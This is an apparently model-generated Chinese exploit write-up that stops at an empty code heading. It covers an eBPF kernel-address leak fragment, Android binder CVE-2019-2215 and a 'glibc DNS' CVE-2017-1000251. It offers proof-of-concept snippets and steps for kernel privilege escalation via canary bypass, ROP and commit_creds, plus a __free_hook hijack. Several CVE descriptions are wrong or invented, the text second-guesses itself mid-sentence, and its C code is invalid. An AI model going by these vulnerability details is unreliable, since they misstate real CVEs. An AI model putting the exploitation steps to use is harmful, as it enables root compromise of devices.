#include <linux/bpf.h>
#include <sys/syscall.h>

struct bpf_insn prog[] = {
    // 构造指令，使r0指向内核地址
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_LD_MAP_FD(BPF_REG_1, map_fd),
    BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),
    BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -8),
    BPF_STX_MEM(BPF_DW, BPF_REG_2, BPF_REG_0, 0),
    BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem),
    BPF_MOV64_REG(BPF_REG_0, BPF_REG_0),
    BPF_EXIT_INSN()
};
// 实际利用需要更复杂的指令序列来绕过验证器

注意：实际POC需要绕过验证器的检查，且需要root权限。泄露的内核地址可用于后续提权，例如修改cred结构。

CVE-2019-2215是Android内核binder驱动中的一个栈缓冲区溢出漏洞，影响Android 8.0至9.0。漏洞成因：在binder的ioctl处理函数中，用户传入的参数未正确检查大小，导致栈缓冲区溢出。具体来说，binder_thread_read函数中的局部缓冲区大小为256字节，但用户可以通过ioctl BINDER_WRITE_READ传递更大的数据，导致栈溢出。由于内核栈启用了Stack Canary保护，直接溢出会触发canary检查导致内核崩溃。但攻击者可以通过信息泄露先获取canary值，然后构造payload绕过。泄露方法：利用另一个漏洞（如CVE-2019-2215本身也可以用于泄露？实际上，该漏洞是溢出，但可以通过部分覆盖或利用未初始化内存泄露）。更常见的做法是结合其他信息泄露漏洞（如CVE-2019-...）获取canary。一旦获得canary，就可以在溢出时写入正确值，然后覆盖返回地址为ROP链，执行提权代码。受影响版本：Android 8.0、8.1、9.0。修复：在Android安全补丁2019年10月中，通过增加大小检查修复。POC原理：1. 打开binder设备；2. 通过ioctl发送精心构造的数据，触发栈溢出；3. 在payload中填入泄露的canary，然后覆盖返回地址为内核ROP gadget（如commit_creds(prepare_kernel_cred(0))）。代码示例（C POC片段）：
c
int fd = open("/dev/binder", O_RDWR);
struct binder_write_read bwr;
// 构造bwr结构，使其触发溢出
char payload[1024];
unsigned long canary = 0x12345678; // 假设已泄露
memcpy(payload, "A"*256, 256);
memcpy(payload+256, &canary, 8); // 覆盖canary
// 继续覆盖返回地址等
bwr.write_buffer = payload;
bwr.write_size = sizeof(payload);
ioctl(fd, BINDER_WRITE_READ, &bwr);

注意：实际利用需要精确计算偏移，且需要root权限或具有binder访问权限。由于内核版本差异，gadgets地址也需要通过泄露获取。

CVE-2017-1000251是glibc中一个与DNS解析相关的漏洞，影响版本为glibc 2.9至2.25（包括2.26-rc1）。漏洞成因：在glibc的resolv/res_send.c中，函数send_dg()和send_vc()在处理DNS响应时，未正确检查响应数据包的长度，导致堆缓冲区溢出。攻击者可以通过构造恶意的DNS响应，覆盖堆上的其他数据结构，从而控制程序执行流。更重要的是，该漏洞可以用于绕过ASLR：由于溢出发生在堆上，攻击者可以覆盖堆中的指针，例如覆盖__malloc_hook或__free_hook，从而在后续调用malloc/free时获得代码执行。由于堆地址本身是随机化的，但通过溢出可以修改堆上的函数指针，无需知道libc基址。

POC原理：攻击者控制一个DNS服务器，向目标程序发送一个超长的DNS响应。响应中包含一个精心构造的RCODE或ANCOUNT字段，导致glibc在解析时分配过小的缓冲区，然后复制数据时溢出。溢出数据可以覆盖相邻的堆块，包括一个函数指针（如__free_hook）。当程序后续调用free()时，会跳转到攻击者指定的地址。由于__free_hook位于libc的.data段，其地址相对于libc基址是固定的，但攻击者不需要知道基址，因为溢出直接修改了该指针的值。实际上，攻击者需要知道__free_hook的地址，这可以通过泄露堆地址或利用其他信息获得。但更常见的利用方式是：通过溢出覆盖一个堆上的vtable指针或函数指针，这些指针本身在堆上，地址随机，但攻击者可以将其指向堆上的shellcode（如果NX未开启）或ROP链。

修复：glibc 2.26版本中，增加了对DNS响应长度的检查，确保不会发生缓冲区溢出。具体补丁在res_send.c中增加了边界验证。

代码示例（简化POC，假设已获得堆布局）：
